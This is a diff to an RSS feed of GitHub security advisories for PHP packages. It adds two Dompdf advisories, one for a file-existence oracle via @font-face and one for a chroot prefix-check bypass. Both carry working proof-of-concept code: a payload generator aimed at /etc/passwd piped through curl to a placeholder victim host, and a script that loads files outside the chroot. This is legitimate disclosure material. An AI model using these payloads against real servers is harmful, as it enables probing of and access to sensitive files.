@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-07-22T19:59:38.276Z</updated>
+    <updated>2026-07-22T21:15:07.404Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,213 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[dompdf/dompdf] Dompdf: File existence oracle via font-face stylesheet declaration]]></title>
+        <id>https://github.com/advisories/GHSA-7x2p-4jvh-6384</id>
+        <link href="https://github.com/advisories/GHSA-7x2p-4jvh-6384"/>
+        <updated>2026-07-22T21:07:09.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p>Dompdf is vulnerable to a <strong>File Existence Oracle</strong> attack through the manipulation of the CSS <code>@font-face</code> directive. By providing malicious HTML that references local files via the <code>file://</code> protocol repeatedly, an attacker can trigger PHP memory exhaustion.</p>
+<p>The critical point of this flaw is the discrepancy in system behavior:</p>
+<ol>
+<li><strong>If the file exists:</strong> Dompdf attempts to process the local resource multiple times, leading to an "Allowed memory size exhausted" error, which crashes the creation.</li>
+<li><strong>If the file does NOT exist:</strong> The rendering engine fails quickly or ignores the import, and the memory limit is not reached.</li>
+</ol>
+<p>This discrepancy allows an attacker to enumerate sensitive files on the server, regardless of <code>CHROOT</code> restrictions.</p>
+<p>Some factors impact the ability of attackers to exploit the vulnerability:</p>
+<ul>
+<li>The attacker must be allowed to provide unrestricted and/or unsanitized HTML content.</li>
+<li>System parameters must be configured in such a way that Dompdf is able to generate a memory overflow error.<ul>
+<li>HTTP GET querystring or POST body must allow large data</li>
+<li>Memory limits must be low enough that Dompdf can trigger an overflow</li>
+<li><code>$_dompdf_show_warnings</code> when set to true can bump memory usage</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="example-scenario">Example Scenario</h2>
+<h3 id="1-vulnerable-system">1. Vulnerable System</h3>
+<p>A web application provides a public mechanism for generating a PDF based on user supplied content. The application accepts raw HTML input or renders user-supplied content without sanitation or validation and processes it using Dompdf.</p>
+<ul>
+<li>Vulnerable Endpoint: <a href="http://example.com/index.php">http://example.com/index.php</a></li>
+<li>Vulnerable Parameter: html_input (POST)</li>
+</ul>
+<p><code>index.php</code> simplified:</p>
+<pre><code>$dompdf = new Dompdf(new Options());
+$dompdf-&gt;loadHtml($_POST['html_input']);
+$dompdf-&gt;render();
+$dompdf-&gt;stream("document.pdf");
+</code></pre>
+<img src="https://github.com/user-attachments/assets/a3fe336c-097a-408a-b8b4-cdbaf5f8d7c4" alt="image" height="1320" width="2530">
+
+<h3 id="2-attack-generation">2. Attack Generation</h3>
+<p>The attacker runs a script locally on their own machine to generate a heavy payload. This payload is then sent to the victim's public endpoint via a standard HTTP POST request.</p>
+<ul>
+<li>Attacker's Local Script (payload_gen.php):</li>
+</ul>
+<pre><code class="language-PHP">&lt;?php
+
+/**
+ * Usage: php exploit.php &lt;file_path&gt; &lt;iterations&gt;
+ * Example: php exploit.php /etc/passwd 5000
+ */
+
+// Check if the file argument was provided
+if ($argc &lt; 2) {
+    echo "[-] Usage: php exploit.php &lt;file_to_read&gt; [iterations]\n";
+    exit(1);
+}
+
+$file = $argv[1];
+$iterations = isset($argv[2]) ? (int)$argv[2] : 5000;
+
+function generate_payload($file, $iterations) {
+    $css = "";
+    $body = "";
+    
+    // We use @font-face to trick the engine into attempting a local file read
+    for ($i = 0; $i &lt; $iterations; $i++) {
+        $css .= "@font-face { font-family: \"f{$i}\"; src: url(\"file://{$file}\"); }\n";
+        $body .= "&lt;span style=\"font-family:f{$i}\"&gt;.&lt;/span&gt;";
+    }
+    
+    return "&lt;html&gt;&lt;head&gt;&lt;style&gt;{$css}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;{$body}&lt;/body&gt;&lt;/html&gt;";
+}
+
+// Output the payload to stdout for piping
+echo generate_payload($file, $iterations);
+
+?&gt;
+</code></pre>
+<h3 id="3-exploitation">3. Exploitation</h3>
+<p>The attacker pipes the malicious HTML into a curl request targeting the remote server:</p>
+<pre><code>php payload_gen.php /etc/passwd 5530 | curl -X POST https://victim-app.com/index.php \
+
+    --data-urlencode "html_input@-" \
+
+    --output response.pdf
+</code></pre>
+<p>By analyzing the <code>response.pdf</code> file generated (by the size or error), the remote attacker can confirm the existence of files without having direct access to the server. When a file reference is valid and the execution parameters are met, Dompdf overflows the PHP limit and hangs/crashes.</p>
+<h4 id="existent-file">Existent file:</h4>
+<img src="https://github.com/user-attachments/assets/a565e9b9-5bf7-486c-acac-c2adfc4af536" alt="image" height="702" width="2544">
+
+<h4 id="non-existent-file">Non-existent file:</h4>
+<img src="https://github.com/user-attachments/assets/6e71dbdd-294a-4b2c-a183-4bbbfddcdee2" alt="image" height="706" width="1872">
+
+<p>Note that the specific iteration count that will trigger the overflow varies by system. This is based on the memory limit imposed by the target system as well as the PHP internals related to memory management (heap allocation and garbage clean up). Under most scenarios there is no apparent difference in memory usage between existent and non-existent files. But with a specific number of file operations the memory limit can be breached only when the file exists.</p>
+<hr>
+<h2 id="impact">Impact</h2>
+<p><strong>Information Disclosure (File Oracle via Reflected HTML)</strong>: In scenarios where a user can control reflected HTML, an attacker can confirm the existence of sensitive local files (e.g., <code>.env</code> files, SSH keys, or system configurations). By observing whether the application returns a memory exhaustion error (file exists) or renders normally (file does not exist), the attacker can systematically map the server's file system.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dompdf/dompdf/security/advisories/GHSA-7x2p-4jvh-6384">https://github.com/dompdf/dompdf/security/advisories/GHSA-7x2p-4jvh-6384</a></li>
+<li><a href="https://github.com/dompdf/dompdf/commit/75c39a083bf7298044fb27399b4cc183054438b4">https://github.com/dompdf/dompdf/commit/75c39a083bf7298044fb27399b4cc183054438b4</a></li>
+<li><a href="https://github.com/dompdf/dompdf/releases/tag/v3.1.6">https://github.com/dompdf/dompdf/releases/tag/v3.1.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-7x2p-4jvh-6384">https://github.com/advisories/GHSA-7x2p-4jvh-6384</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7x2p-4jvh-6384</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-22T21:07:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[dompdf/dompdf] Dompdf: Chroot Validation Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-wvh6-f5jh-8gw4</id>
+        <link href="https://github.com/advisories/GHSA-wvh6-f5jh-8gw4"/>
+        <updated>2026-07-22T21:06:49.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The chroot check for local files uses a prefix string check to enforce chroot boundaries. The simple string comparison it performs allows paths like /var/www/root_secret/file.html when chroot is /var/www/root.</p>
+<p>This allows attacker-controlled document paths/resources to bypass intended local file restrictions.</p>
+<h3 id="details">Details</h3>
+<p>The <code>validateLocalUri()</code> method is used to check if a local file is within an allowed chroot directory. After normalization with <code>realpath()</code>, this check is performed with a <code>strpos()</code> comparison:</p>
+<pre><code>    public function validateLocalUri(string $uri)
+    {
+        ...
+        $realfile = realpath(str_replace("file://", "", $uri));
+        ...
+        foreach ($dirs as $chrootPath) {
+            $chrootPath = realpath($chrootPath);
+            if ($chrootPath !== false &amp;&amp; strpos($realfile, $chrootPath) === 0) {
+                $chrootValid = true;
+</code></pre>
+<p>Due to the normalization, the <code>$chrootPath</code> string does not have a terminating directory separator (<code>/</code>) appended. Because of this, the <code>strpos()</code> check only validates that <code>$chrootPath</code> is a <em>prefix</em> of  <code>$realfile</code>. This allows access to folders with similar names that fall outside of the defined chroot restrictions.</p>
+<p>For example, a chroot setting of <code>/var/www/</code> would be normalized to <code>/var/www</code>, removing the trailing <code>/</code>. During <code>strpos()</code>, a <code>$chrootPath</code> of <code>/var/www</code> will also match a <code>$realfile</code> starting with <code>/var/www2</code>, <code>/var/www-admin</code>, or <code>/var/www_backup</code>, despite these being different directories.</p>
+<h3 id="poc">PoC</h3>
+<p>With a directory structure similar to:</p>
+<pre><code>/home/dompdf/
+  |--&gt; web/
+        |--&gt; pdf.php
+        |--&gt; cat0.jpg
+  |--&gt; web-admin/
+        |--&gt; cat1.jpg
+</code></pre>
+<p>And web-accessible Dompdf functionality similar to the following (poc.html):</p>
+<pre><code>&lt;?php
+require 'vendor/autoload.php';
+use Dompdf\Dompdf;
+use Dompdf\Options;
+
+$options = new Options();
+$options-&gt;setChroot(['/home/dompdf/web/']);
+$dompdf = new Dompdf($options);
+
+$dompdf-&gt;loadHtml($_POST['html']);
+$dompdf-&gt;render();
+$dompdf-&gt;stream();
+?&gt;
+</code></pre>
+<p>A malicious actor can exploit the vulnerability with the following script:</p>
+<pre><code>$html = &lt;&lt;&lt;HTML
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;p&gt;within chroot&lt;/p&gt;
+            &lt;img src="/home/dompdf/web/cat0.jpg"&gt;
+        &lt;p&gt;outside of chroot&lt;/p&gt;
+            &lt;img src="/home/dompdf/web-admin/cat1.jpg"&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+HTML;
+
+$url = 'http://example.com/poc.php';
+$data = ['html' =&gt; $html];
+$headers = ["Content-type: application/x-www-form-urlencoded"];
+
+// use key 'http' even if you send the request to https://...
+$options = [
+    'http' =&gt; [
+        'header' =&gt; $headers,
+        'method' =&gt; 'POST',
+        'content' =&gt; http_build_query($data),
+        'ignore_errors' =&gt; true,
+    ],
+];
+$context = stream_context_create($options);
+$response = file_get_contents($url, false, $context);
+</code></pre>
+<p>When the PDF is generated, both <code>jpg</code> files are loaded successfully despite the <code>cat1.jpg</code> file being outside of the allowed chroot.</p>
+<h3 id="impact">Impact</h3>
+<p>An attacker that controls a portion of the rendered HTML could leverage this vulnerability to bypass chroot restrictions and access potentially sensitive files from outside of the allowed directories.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dompdf/dompdf/security/advisories/GHSA-wvh6-f5jh-8gw4">https://github.com/dompdf/dompdf/security/advisories/GHSA-wvh6-f5jh-8gw4</a></li>
+<li><a href="https://github.com/dompdf/dompdf/commit/1b3b61ec4f6962678e56ee8a42920b4f835ab006">https://github.com/dompdf/dompdf/commit/1b3b61ec4f6962678e56ee8a42920b4f835ab006</a></li>
+<li><a href="https://github.com/dompdf/dompdf/releases/tag/v3.1.6">https://github.com/dompdf/dompdf/releases/tag/v3.1.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-wvh6-f5jh-8gw4">https://github.com/advisories/GHSA-wvh6-f5jh-8gw4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wvh6-f5jh-8gw4</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-22T21:06:48.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[guzzlehttp/psr7] guzzlehttp/psr7: Host Confusion via Weak URI Host Validation]]></title>
         <id>https://github.com/advisories/GHSA-c2w2-prh8-qm98</id>
@@ -848,55 +1055,5 @@ pheditor-terminal-bypass
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2024-05-15T21:47:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[typo3/cms-fluid] TYPO3 Cross-Site Scripting in Fluid ViewHelpers]]></title>
-        <id>https://github.com/advisories/GHSA-22q7-cg4r-p9mx</id>
-        <link href="https://github.com/advisories/GHSA-22q7-cg4r-p9mx"/>
-        <updated>2026-07-16T18:44:35.000Z</updated>
-        <content type="html"><![CDATA[<p>Failing to properly encode user input, templates using built-in Fluid ViewHelpers are vulnerable to cross-site scripting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/typo3/cms-core/2019-01-22-4.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/typo3/cms-core/2019-01-22-4.yaml</a></li>
-<li><a href="https://typo3.org/security/advisory/typo3-core-sa-2019-005">https://typo3.org/security/advisory/typo3-core-sa-2019-005</a></li>
-<li><a href="https://github.com/TYPO3-CMS/fluid/commit/1a65dcc4a8f17f61a8055c0fd46c324c44c9980d">https://github.com/TYPO3-CMS/fluid/commit/1a65dcc4a8f17f61a8055c0fd46c324c44c9980d</a></li>
-<li><a href="https://github.com/TYPO3-CMS/fluid/commit/a40f468d1534a68cfce91ce2a8e2a1ff81db5cf5">https://github.com/TYPO3-CMS/fluid/commit/a40f468d1534a68cfce91ce2a8e2a1ff81db5cf5</a></li>
-<li><a href="https://github.com/TYPO3-CMS/fluid/compare/v8.7.22...v8.7.23">https://github.com/TYPO3-CMS/fluid/compare/v8.7.22...v8.7.23</a></li>
-<li><a href="https://github.com/TYPO3-CMS/fluid/compare/v9.5.3...v9.5.4">https://github.com/TYPO3-CMS/fluid/compare/v9.5.3...v9.5.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-22q7-cg4r-p9mx">https://github.com/advisories/GHSA-22q7-cg4r-p9mx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-22q7-cg4r-p9mx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2024-05-30T15:46:01.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[typo3/cms-fluid] TYPO3 Cross-Site Scripting in Fluid ViewHelpers]]></title>
-        <id>https://github.com/advisories/GHSA-22q7-cg4r-p9mx</id>
-        <link href="https://github.com/advisories/GHSA-22q7-cg4r-p9mx"/>
-        <updated>2026-07-16T18:44:35.000Z</updated>
-        <content type="html"><![CDATA[<p>Failing to properly encode user input, templates using built-in Fluid ViewHelpers are vulnerable to cross-site scripting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/typo3/cms-core/2019-01-22-4.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/typo3/cms-core/2019-01-22-4.yaml</a></li>
-<li><a href="https://typo3.org/security/advisory/typo3-core-sa-2019-005">https://typo3.org/security/advisory/typo3-core-sa-2019-005</a></li>
-<li><a href="https://github.com/TYPO3-CMS/fluid/commit/1a65dcc4a8f17f61a8055c0fd46c324c44c9980d">https://github.com/TYPO3-CMS/fluid/commit/1a65dcc4a8f17f61a8055c0fd46c324c44c9980d</a></li>
-<li><a href="https://github.com/TYPO3-CMS/fluid/commit/a40f468d1534a68cfce91ce2a8e2a1ff81db5cf5">https://github.com/TYPO3-CMS/fluid/commit/a40f468d1534a68cfce91ce2a8e2a1ff81db5cf5</a></li>
-<li><a href="https://github.com/TYPO3-CMS/fluid/compare/v8.7.22...v8.7.23">https://github.com/TYPO3-CMS/fluid/compare/v8.7.22...v8.7.23</a></li>
-<li><a href="https://github.com/TYPO3-CMS/fluid/compare/v9.5.3...v9.5.4">https://github.com/TYPO3-CMS/fluid/compare/v9.5.3...v9.5.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-22q7-cg4r-p9mx">https://github.com/advisories/GHSA-22q7-cg4r-p9mx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-22q7-cg4r-p9mx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2024-05-30T15:46:01.000Z</published>
     </entry>
 </feed>
